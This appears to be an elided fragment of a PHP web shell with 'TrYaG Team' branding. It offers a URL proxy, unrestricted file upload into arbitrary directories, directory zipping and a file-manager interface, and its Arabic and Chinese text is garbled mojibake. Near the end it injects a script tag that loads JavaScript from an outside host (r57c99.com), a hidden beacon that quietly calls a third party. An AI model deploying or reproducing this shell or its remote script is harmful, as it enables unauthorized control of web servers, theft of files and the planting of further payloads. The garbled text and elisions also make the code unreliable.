...
<html>
<head>
<title>*  TrYaG Team  * </title>
<body bgcolor="#000000">
<table Width='100%' height='10%' bgcolor='#AA0000' border='1'>
<tr>
<td><center><font size='6' color='#BBB516'> tRyaG TeaM ___ IsL4m1C ~ W4rR10R</font></center></td>
</tr>
</table>
<style type="text/css">
body, td {
...
if (isset($_POST['url'])) {
	...
	echo ($proxycontents) ? $proxycontents : "<body bgcolor=\"#F5F5F5\" style=\"font-size: 12px;\"><center><br><p><b>ªÒ»° URL ƒ⁄»› ß∞‹</b></p></center></body>";
	exit;
}
...
Ã„Ì⁄ «·ÕﬁÊﬁ „Õ›ÊŸ… <br><br>
„‰Ÿ„… «·ﬂ«”— «·–Â»Ì &   —Ì«ﬁ «·⁄—»  <br><br>
WWW.TrYaG.CoM/vb <br><br>
Ì”„Õ »«·‰ﬁ· »” «—ÃÊ ⁄œ„ «“«·Â  ÕﬁÊﬁ «·›— Ìﬁ <br><br>";
...
if ($doupfile) {
	echo (@copy($_FILES['uploadfile']['tmp_name'],"".$uploaddir."/".$_FILES['uploadfile']['name']."")) ? "…œ¥´≥…π¶!" : "…œ¥´ ß∞‹!";
}
...
echo "</table>\n";
		...
		function PHPZip($dir)	{
    		if (@function_exists('gzcompress'))	{
				...
				if (is_array($dir)) $filelist = $dir;
			        ...
			        $filelist=$this -> GetFileList($dir);//Œƒº˛¡–±Ì
	...
	class FORMS {
		...
		function formheader($action='',$title,$target='') {
			...
			echo "  <tr class=\"firstalt\">\n";
			echo "	<td align=\"center\"><b>".$title." [<a href=\"?dir=".urlencode($dir)."\">∑µªÿ</a>]</b></td>\n";
			echo "  </tr>\n";
		}
...
$tb->tdbody ("</td></tr></table>");
<SCRIPT SRC=http://www.r57c99.com/n3wsh3l/ciz.js></SCRIPT>
$tb->tableheader();
